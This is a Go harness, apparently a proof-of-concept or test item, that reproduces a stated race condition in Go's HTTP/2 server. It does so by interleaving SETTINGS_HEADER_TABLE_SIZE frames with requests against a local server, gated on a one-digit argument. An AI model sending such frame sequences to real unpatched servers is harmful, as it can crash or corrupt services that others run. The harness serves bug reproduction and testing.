// Harness for CVE-2026-97032 (Go net/http HTTP/2 server, Go < 1.26.9):
// the serve goroutine resizes the HPACK encoder while the writeFrameAsync
// goroutine encodes response headers with it.
//
// Usage: ./http2-hpack-tablesize <setting-id>
//
//	<setting-id>  identifier of the SETTINGS parameter that the client sends
//	              between requests (one ASCII digit, 1 to 6)
//
// The race needs setting-id 1 (SETTINGS_HEADER_TABLE_SIZE).
package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const requests = 200

func settingValue(id http2.SettingID, round int) uint32 {
	switch id {
	case http2.SettingHeaderTableSize:
		return uint32(1024 * (1 + round%4))
	case http2.SettingEnablePush:
		return 0
	case http2.SettingInitialWindowSize:
		return 65535
	case http2.SettingMaxFrameSize:
		return 16384
	default:
		return 4096
	}
}

func main() {
	if len(os.Args) != 2 || len(os.Args[1]) != 1 || os.Args[1][0] < '1' || os.Args[1][0] > '6' {
		fmt.Println("Usage: ./http2-hpack-tablesize <setting-id>")
		return
	}
	id := http2.SettingID(os.Args[1][0] - '0')

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		fmt.Println("listen:", err)
		return
	}
	srv := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Bomb", "input-gated")
		w.WriteHeader(http.StatusOK)
	})}
	srv.Protocols = new(http.Protocols)
	srv.Protocols.SetUnencryptedHTTP2(true)
	go srv.Serve(ln)
	defer srv.Close()

	conn, err := net.Dial("tcp", ln.Addr().String())
	if err != nil {
		fmt.Println("dial:", err)
		return
	}
	defer conn.Close()
	if _, err := io.WriteString(conn, http2.ClientPreface); err != nil {
		fmt.Println("preface:", err)
		return
	}
	fr := http2.NewFramer(conn, conn)
	if err := fr.WriteSettings(); err != nil {
		fmt.Println("settings:", err)
		return
	}

	responses := make(chan struct{}, requests)
	go func() {
		rf := http2.NewFramer(io.Discard, conn)
		for {
			f, err := rf.ReadFrame()
			if err != nil {
				close(responses)
				return
			}
			if h, ok := f.(*http2.HeadersFrame); ok && h.StreamEnded() {
				responses <- struct{}{}
			}
		}
	}()

	var hbuf bytes.Buffer
	enc := hpack.NewEncoder(&hbuf)
	for i := 0; i < requests; i++ {
		hbuf.Reset()
		for _, f := range []hpack.HeaderField{
			{Name: ":method", Value: "GET"},
			{Name: ":scheme", Value: "http"},
			{Name: ":authority", Value: "localhost"},
			{Name: ":path", Value: "/"},
		} {
			enc.WriteField(f)
		}
		if err := fr.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      uint32(2*i + 1),
			BlockFragment: hbuf.Bytes(),
			EndStream:     true,
			EndHeaders:    true,
		}); err != nil {
			fmt.Println("headers:", err)
			return
		}
		if err := fr.WriteSettings(http2.Setting{ID: id, Val: settingValue(id, i)}); err != nil {
			fmt.Println("settings:", err)
			return
		}
	}

	deadline := time.After(3 * time.Second)
	for i := 0; i < requests; i++ {
		select {
		case _, ok := <-responses:
			if !ok {
				fmt.Println("connection closed")
				return
			}
		case <-deadline:
			fmt.Println("timeout")
			return
		}
	}
	fmt.Println("OK")
}
	